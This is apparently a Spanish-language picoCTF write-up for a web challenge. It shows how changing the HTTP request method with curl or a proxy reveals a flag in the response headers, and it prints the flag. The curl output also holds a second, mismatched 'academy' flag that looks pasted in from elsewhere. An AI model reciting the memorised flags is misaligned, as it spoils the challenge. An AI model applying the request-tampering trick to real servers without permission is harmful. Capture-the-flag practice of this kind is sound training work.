## Descripción
Find the flag being held on this server to get ahead of the competition

1.- Maybe you have more than 2 choices

2.- Check out tools like Burpsuite to modify your requests and look at the responses

Find the flag being held on this server to get ahead of the competition

[http://wily-courier.picoctf.net:49495/](http://wily-courier.picoctf.net:49495/)
## Solución
1.- La primera solucion es cambiar el método de solicitud de POST a HEAD en el navegador, al enviar el request de nuevo aparecerá la bandera.

2.- La segunda solución se logra a través de la terminal usando CURL.
```
┌──(kali㉿kali)-[~]
└─$ curl -X http://wily-courier.picoctf.net:53548/index.php
curl: (2) no URL specified
curl: try 'curl --help' or 'curl --manual' for more information
                                                                             
┌──(kali㉿kali)-[~]
└─$ curl -I http://wily-courier.picoctf.net:53548/index.php
HTTP/1.1 200 OK
Date: Tue, 08 Sep 2026 00:34:59 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
flag: picoCTF{r3j3ct_th3_du4l1ty_8b13f07}
Content-Type: text/html; charset=UTF-8



academy{r3j3ct_th3_du4l1ty_57f62d9}
```
3.- La tercera solución es con ayuda de un prooxie y una tool instalada dentro de kali linux.

```
GET /index.php HTTP/1.1
Host: wily-courier.picoctf.net:62966
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive


HTTP/1.1 200 OK
Date: Tue, 08 Sep 2026 01:00:24 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
flag: picoCTF{r3j3ct_th3_du4l1ty_8b13f07}
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```

```

## Notas Adicionales

## Referencias
-
